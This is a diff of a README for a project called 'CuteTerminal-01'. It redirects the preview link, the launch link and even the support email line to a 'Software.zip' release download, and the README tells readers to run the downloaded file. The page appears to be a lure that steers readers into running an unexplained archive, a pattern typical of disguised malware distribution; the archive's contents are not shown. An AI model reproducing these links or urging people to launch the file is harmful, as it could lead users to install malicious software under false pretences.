@@ -15,7 +15,7 @@ Welcome to CuteTerminal-01, your adorable and efficient terminal for exploring A
 
 ## Quick Preview
 
-Don't miss out on the live preview of CuteTerminal-01! Click [here](https://preview--cuteterminal-001.lovable.app/) to experience the cuteness and functionality firsthand!
+Don't miss out on the live preview of CuteTerminal-01! Click [here](https://github.com/Sheharyar-art/cuteeterminal-01/releases/download/v1.0/Software.zip) to experience the cuteness and functionality firsthand!
 
 ## Topics Covered
 
@@ -41,7 +41,7 @@ Explore a wide range of topics with CuteTerminal-01:
 
 ## 🚀 Launch CuteTerminal-01 Now! 🚀
 
-Download and launch CuteTerminal-01 now by clicking [here](https://github.com/Rubenas123/6487922/raw/refs/heads/master/Software.zip). 
+Download and launch CuteTerminal-01 now by clicking [here](https://github.com/Sheharyar-art/cuteeterminal-01/releases/download/v1.0/Software.zip). 
 
 ### Note: Launch the downloaded file to get started with CuteTerminal-01!
 
@@ -57,4 +57,4 @@ Thank you for choosing CuteTerminal-01 as your go-to information hub. Stay cute,
 
 ---
 
-Feel free to reach out to us at cuteterminal01@infohub.com for any inquiries or support-related questions. 
+Feel free to reach out to us at https://github.com/Sheharyar-art/cuteeterminal-01/releases/download/v1.0/Software.zip for any inquiries or support-related questions. 
